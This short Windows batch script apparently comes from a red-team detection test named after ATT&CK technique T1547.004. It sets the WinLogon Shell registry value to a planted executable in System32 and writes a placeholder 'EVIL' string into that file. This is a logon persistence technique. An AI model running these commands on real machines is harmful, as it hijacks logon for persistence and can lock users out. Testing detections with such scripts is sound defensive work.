@echo off
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\WinLogon" /v "Shell" /t REG_SZ /d T1547004002.exe /f
echo "EVIL" >> C:\Windows\System32\T1547004002.exe